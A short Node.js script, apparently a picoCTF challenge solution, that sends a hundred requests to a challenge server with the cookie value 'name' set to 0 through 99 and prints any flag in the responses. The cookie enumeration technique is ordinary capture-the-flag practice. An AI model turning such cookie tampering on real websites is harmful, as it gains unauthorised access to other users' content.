const axios = require('axios').default;


async function main() {
  const re = /picoCTF{.*}/g;
  for (let i = 0; i < 100; i++) {
    await axios.get('http://mercury.picoctf.net:21485/check', {
      headers: { Cookie: `name=${i}` },
    })
      .then((res) => {
        console.log(i.toString() + ': ');
        if (re.test(res.data)) {
          console.log(res.data.match(re));
        }
      });
  }
}

main();
